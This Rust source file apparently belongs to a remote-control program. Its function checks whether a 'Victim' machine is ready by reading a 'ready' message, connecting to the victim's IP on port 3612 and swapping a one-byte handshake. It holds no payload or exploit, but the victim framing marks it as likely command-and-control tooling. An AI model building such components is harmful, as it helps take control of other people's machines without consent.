use std::{net::TcpStream, io::{Write, BufReader, BufRead, Read}};

use crate::Victim;

pub fn is_victim_listening(stream: &TcpStream, victim: &Victim) -> bool {
    let mut buf_reader = BufReader::new(stream);

    let mut buffer = Vec::new();
    buf_reader.read_until(0, &mut buffer).unwrap();
    let buffer = std::str::from_utf8(&buffer).unwrap();
    println!("buffer: {}", buffer);
    if buffer != "ready" {
        return false;
    }
    let mut stream = match TcpStream::connect(victim.ip.ip().to_string() + ":3612") {
        Ok(stream) => stream,
        Err(_) => {
            eprintln!("Failed to connect to the client's server");
            return false;
        }
    };

    if let Err(_) = stream.write_all(&[1]) {
        return false;
    }
    let mut buf_reader = BufReader::new(&stream);
    let mut buffer: [u8; 1] = [0];
    if let Err(err) = buf_reader.read_exact(&mut buffer) {
        eprintln!("Failed to connect to the client's server: {}", err);
        return false;
    }
    if buffer != [9] {
        eprintln!("The client's server didn't send 9 back");
        return false;
    }
    true
}
